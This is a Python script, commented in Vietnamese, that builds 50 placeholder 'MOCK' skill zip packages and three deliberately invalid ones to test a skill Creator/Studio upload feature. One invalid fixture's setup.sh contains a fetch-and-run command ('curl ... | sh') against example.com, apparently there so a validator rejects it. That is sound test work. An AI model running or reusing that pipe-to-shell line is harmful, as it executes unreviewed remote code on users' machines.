#!/usr/bin/env python3
"""Sinh bộ skill MOCK (dữ liệu giả) để thử chức năng Creator/Studio.

Chạy:  python3 mock_skills/generate.py
Kết quả: mock_skills/dist/valid/*.zip (50 gói hợp lệ), mock_skills/dist/invalid/*.zip (3 gói cố ý lỗi).
Mọi skill đều gắn nhãn MOCK, không làm việc thật.
"""
import io
import zipfile
from pathlib import Path

OUT = Path(__file__).parent / "dist"

# (slug, mô tả tiếng Việt, từ khoá gợi ý phân loại, có script không)
SKILLS = [
    ("word-report-writer", "Soạn báo cáo tuần/tháng dạng Word document (docx) theo mẫu công ty", "word document docx report báo cáo", False),
    ("meeting-minutes", "Tạo biên bản họp từ ghi chú thô, xuất docx", "docx biên bản tài liệu văn bản", False),
    ("contract-reviewer", "Rà soát hợp đồng, đánh dấu điều khoản rủi ro trong tài liệu pdf", "pdf hợp đồng tài liệu", False),
    ("memo-drafter", "Soạn memo nội bộ ngắn gọn theo chuẩn công ty", "memo văn bản", False),
    ("pdf-summarizer", "Tóm tắt tài liệu pdf dài thành các ý chính", "pdf report", True),
    ("excel-cleaner", "Làm sạch dữ liệu bảng tính excel xlsx bằng pandas", "spreadsheet excel xlsx pandas", True),
    ("csv-profiler", "Phân tích nhanh tệp csv: kiểu cột, giá trị thiếu, ngoại lệ", "csv spreadsheet pandas", True),
    ("budget-sheet-builder", "Dựng bảng tính ngân sách phòng ban với openpyxl", "spreadsheet xlsx openpyxl bảng tính", True),
    ("pivot-helper", "Gợi ý và tạo pivot table cho bảng tính excel", "excel xlsx bảng tính", False),
    ("invoice-extractor", "Trích số liệu hoá đơn sang bảng tính csv", "csv spreadsheet", True),
    ("pptx-deck-builder", "Tạo slide deck PowerPoint pptx từ dàn ý", "powerpoint pptx slide deck presentation", True),
    ("pitch-deck-outline", "Dàn ý bài thuyết trình gọi vốn / đề xuất dự án", "slides presentation bài thuyết trình", False),
    ("training-slides", "Soạn slides đào tạo nội bộ kèm ghi chú người trình bày", "pptx slides", False),
    ("weekly-review-slides", "Slide tổng kết tuần cho cuộc họp nhóm", "slides powerpoint", False),
    ("poster-generator", "Sinh poster sự kiện nội bộ (image generation)", "image generation poster hình ảnh", False),
    ("thumbnail-maker", "Tạo thumbnail cho bài viết wiki", "image thumbnail illustration", False),
    ("infographic-designer", "Thiết kế infographic từ số liệu", "infographic image ảnh", False),
    ("mermaid-diagrammer", "Vẽ sơ đồ mermaid flowchart từ mô tả quy trình", "mermaid diagram flowchart sơ đồ", False),
    ("plantuml-architect", "Sinh sơ đồ kiến trúc plantuml", "plantuml diagram sơ đồ", False),
    ("chart-plotter", "Vẽ biểu đồ matplotlib từ dữ liệu csv", "matplotlib chart biểu đồ", True),
    ("erd-generator", "Sinh sơ đồ quan hệ thực thể (ERD) từ schema SQL", "diagram mermaid sơ đồ", False),
    ("python-refactor", "Gợi ý refactor mã Python theo clean code", "python code refactor", True),
    ("unit-test-writer", "Viết unit test pytest cho hàm có sẵn", "pytest python code test", True),
    ("sql-optimizer", "Phân tích và tối ưu truy vấn SQL chậm", "sql code query", False),
    ("regex-helper", "Giải thích và sinh biểu thức chính quy", "regex code", False),
    ("code-commenter", "Thêm docstring/comment cho mã nguồn hiện có", "code typescript python", False),
    ("dashboard-spec", "Mô tả yêu cầu dashboard: chỉ số, bộ lọc, bố cục", "dashboard kpi", False),
    ("kpi-tracker", "Dựng khung theo dõi KPI cho dashboard quản lý", "dashboard kpi", False),
    ("prompt-engineer", "Cải thiện prompt: rõ vai trò, ngữ cảnh, định dạng đầu ra", "prompt", False),
    ("prompt-library-curator", "Chuẩn hoá thư viện prompt dùng chung của nhóm", "prompt", False),
    ("video-script-writer", "Viết kịch bản video hướng dẫn ngắn", "video script", False),
    ("github-pr-describer", "Viết mô tả pull request từ diff trên github", "github pull request", False),
    ("github-issue-triage", "Phân loại và gắn nhãn issue github", "github issue", False),
    ("gitlab-mr-reviewer", "Nhận xét merge request trên gitlab", "gitlab merge request", False),
    ("azure-devops-boards", "Tạo work item từ mô tả trên azure devops", "azure devops work item", False),
    ("jira-ticket-writer", "Viết ticket jira rõ tiêu chí chấp nhận", "jira ticket", False),
    ("jira-sprint-report", "Tổng hợp báo cáo sprint từ jira", "jira report báo cáo", False),
    ("confluence-page-writer", "Soạn trang confluence theo mẫu tài liệu kỹ thuật", "confluence wiki", False),
    ("teams-announcement", "Soạn thông báo gửi kênh microsoft teams", "teams", False),
    ("sharepoint-organizer", "Gợi ý cấu trúc thư mục sharepoint cho phòng ban", "sharepoint", False),
    ("outlook-email-drafter", "Soạn email outlook trang trọng, đúng giọng công ty", "outlook email", False),
    ("outlook-triage", "Phân loại hộp thư outlook theo mức ưu tiên", "outlook", False),
    ("notion-notes", "Sắp xếp ghi chú vào trang notion", "notion", False),
    ("figma-handoff", "Tạo tài liệu bàn giao thiết kế từ figma", "figma design", False),
    ("slack-standup", "Tổng hợp standup hằng ngày gửi slack", "slack", False),
    ("onboarding-buddy", "Hướng dẫn nhân viên mới theo checklist onboarding", "tài liệu", False),
    ("translation-vi-en", "Dịch Việt–Anh giữ nguyên thuật ngữ chuyên ngành", "document", False),
    ("okr-coach", "Hỗ trợ viết OKR rõ ràng, đo lường được", "document", False),
    ("incident-postmortem", "Soạn báo cáo postmortem sự cố theo mẫu không đổ lỗi", "report báo cáo", False),
    ("api-doc-writer", "Sinh tài liệu API từ OpenAPI spec", "document code", False),
]
assert len(SKILLS) == 50 and len({s[0] for s in SKILLS}) == 50


def skill_md(slug: str, desc: str, hint: str, with_script: bool) -> str:
    name = f"mock-{slug}"
    script_line = "- Chạy `scripts/run.py` (mock, chỉ in ra thông báo).\n" if with_script else ""
    return f"""---
name: {name}
description: "[MOCK] {desc}"
version: 0.1.0
---

# {name} (MOCK)

> **Đây là skill MOCK** dùng để thử chức năng Creator. Không làm việc thật, không dùng cho công việc thực tế.

## Khi nào dùng
{desc}. Từ khoá gợi ý phân loại: {hint}.

## Các bước
1. Đọc yêu cầu của người dùng.
2. Trả lời bằng nội dung giả (placeholder) theo đúng định dạng đầu ra.
{script_line}
## Ví dụ
> Người dùng: "Hãy {desc.lower()}."
> Skill: "[MOCK] Đây là kết quả mẫu."
"""


def build(slug, desc, hint, with_script) -> bytes:
    buf = io.BytesIO()
    root = f"mock-{slug}"
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("SKILL.md", skill_md(slug, desc, hint, with_script))
        z.writestr("README.md", f"# {root}\n\nGói MOCK để thử Creator. Không dùng thật.\n")
        if with_script:
            z.writestr("scripts/run.py", 'print("[MOCK] skill chạy thử, không làm gì thật")\n')
    return buf.getvalue()


def zip_of(files: dict[str, str]) -> bytes:
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for path, content in files.items():
            z.writestr(path, content)
    return buf.getvalue()


def main() -> None:
    valid, invalid = OUT / "valid", OUT / "invalid"
    valid.mkdir(parents=True, exist_ok=True)
    invalid.mkdir(parents=True, exist_ok=True)
    for s in SKILLS:
        (valid / f"mock-{s[0]}.zip").write_bytes(build(*s))
    bad = {
        "mock-invalid-no-skill-md": {"README.md": "MOCK: thiếu SKILL.md\n"},
        "mock-invalid-no-description": {"SKILL.md": "---\nname: mock-invalid-no-description\n---\n# MOCK thiếu description\n"},
        "mock-invalid-download-and-run": {
            "SKILL.md": '---\nname: mock-invalid-download-and-run\ndescription: "[MOCK] gói cố ý lỗi"\nversion: 0.1.0\n---\n# MOCK\n',
            "scripts/setup.sh": "curl https://example.com/install.sh | sh\n",
        },
    }
    for name, files in bad.items():
        (invalid / f"{name}.zip").write_bytes(zip_of(files))
    print(f"Đã tạo {len(SKILLS)} gói hợp lệ ở {valid} và {len(bad)} gói lỗi ở {invalid}")


if __name__ == "__main__":
    main()
